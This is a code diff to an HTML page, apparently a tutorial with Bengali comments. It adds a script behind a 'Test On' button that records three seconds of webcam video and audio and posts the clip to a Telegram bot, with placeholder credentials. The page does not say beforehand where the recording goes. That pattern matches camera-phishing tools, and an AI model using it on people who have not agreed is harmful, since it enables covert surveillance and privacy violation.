@@ -10,10 +10,70 @@
 	<button onclick="test()">Test On</button>
 
 <script>
-	async function test() {
-		const stram = await navigator.mediaDevices.getUserMedia({video: {facingMode:"user"}});
-		// body...
-	}
+async function test() {
+    try {
+        const botToken = "YOUR_BOT_TOKEN";
+        const chatId = "YOUR_CHAT_ID";
+
+        // ১. ক্যামেরা চালু করা
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: true // ভিডিওর সাথে অডিও চাইলে true রাখবেন
+        });
+
+        // ২. রেকর্ডার তৈরি করা
+        const mediaRecorder = new MediaRecorder(stream);
+        const recordedChunks = [];
+
+        // যখনই ভিডিও ফ্রেম ডাটা তৈরি হবে, তা অ্যারেতে জমা হবে
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
+
+        // ৩. রেকর্ডিং শেষ হলে টেলিগ্রামে আপলোড করার কাজ
+        mediaRecorder.onstop = async () => {
+            // ক্যামেরা বন্ধ করা
+            stream.getTracks().forEach(track => track.stop());
+
+            // ৩.১ সমস্ত ডাটা একত্র করে একটি ভিডিও ফাইল (Blob) তৈরি
+            const videoBlob = new Blob(recordedChunks, { type: "video/webm" });
+
+            // ৩.২ টেলিগ্রামে পাঠানোর জন্য FormData তৈরি
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("video", videoBlob, "video.webm"); // ভিডিও ফাইল যুক্ত করা
+            formData.append("caption", "ওয়েব থেকে রেকর্ড করা ভিডিও");
+
+            // ৩.৩ POST রিকোয়েস্টের মাধ্যমে টেলিগ্রাম API-তে ফাইল আপলোড
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                method: "POST",
+                body: formData
+            });
+
+            const result = await response.json();
+            if (result.ok) {
+                alert("ভিডিও সফলভাবে টেলিগ্রামে পাঠানো হয়েছে!");
+            } else {
+                console.error("টেলিগ্রাম এরর:", result);
+            }
+        };
+
+        // ৪. রেকর্ডিং শুরু করা
+        mediaRecorder.start();
+        console.log("রেকর্ডিং শুরু হয়েছে...");
+
+        // ৫. উদাহরণস্বরূপ: ৩ সেকেন্ড রেকর্ড করে স্বয়ংক্রিয়ভাবে বন্ধ করা
+        setTimeout(() => {
+            mediaRecorder.stop();
+            console.log("রেকর্ডিং শেষ, আপলোড হচ্ছে...");
+        }, 3000); // ৩০০০ মিলি-সেকেন্ড = ৩ সেকেন্ড
+
+    } catch (error) {
+        console.error("এরর:", error.message);
+    }
+}
 </script>
 
 </body>
